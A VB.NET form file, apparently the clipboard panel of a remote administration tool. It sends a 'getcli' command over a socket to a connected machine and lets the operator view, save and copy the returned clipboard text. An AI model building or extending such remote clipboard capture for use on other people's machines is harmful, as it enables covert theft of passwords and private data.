Imports System.Text
Imports System
Imports System.IO
Imports System.Windows.Forms.Form
Imports System.Windows.Forms
Imports System.Windows.Forms.MessageBox
Imports System.Windows.Forms.TextBox
Imports System.Windows.Forms.Label
Imports System.Diagnostics


'coded pjoao1578
'v2
Public Class clickbord
    Public sock As Integer
    Dim yy As String = "||" ' yy = "||" = senha

    Private Sub clickbord_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'get
        Try
            Form1.s.Send(sock, "getcli")
        Catch ex As Exception
        End Try
    End Sub

    Private Sub CleanTXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CleanTXTToolStripMenuItem.Click
        'linpar txt
        Me.TextBox1.Clear() 'clean
    End Sub

    Private Sub UpdeterToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdeterToolStripMenuItem.Click
        'get
        Try
            Form1.s.Send(sock, "getcli")
        Catch ex As Exception
        End Try
    End Sub

    Private Sub SaveTXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveTXTToolStripMenuItem.Click
        'salvar em txt
        Dim sd As New SaveFileDialog()
        sd.Filter = "Clickbord TXT (*.txt)|*.txt" '.txt
        sd.FileName = "Clickbord.txt" 'name
        If sd.ShowDialog() = Windows.Forms.DialogResult.OK Then
            Dim b As New StringBuilder()
            b.Append(Me.TextBox1.Text & vbNewLine)
            IO.File.WriteAllText(sd.FileName, b.ToString())
            MessageBox.Show("Salvo Em TXT", "Salvo", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'Mensagem
        End If
    End Sub

    Private Sub SelectdCopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SelectdCopyToolStripMenuItem.Click
        'selectd copy
        Try
            My.Computer.Clipboard.SetText(TextBox1.SelectedText) 'copy txt Selected
        Catch ex As Exception 'erro nao report
        End Try
    End Sub

    Private Sub AllCopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AllCopyToolStripMenuItem.Click
        'select all txt
        Me.TextBox1.SelectAll() 'select all txt
        Try
            My.Computer.Clipboard.SetText(TextBox1.Text) 'copy txt all
        Catch ex As Exception 'erro nao report
        End Try
    End Sub
End Class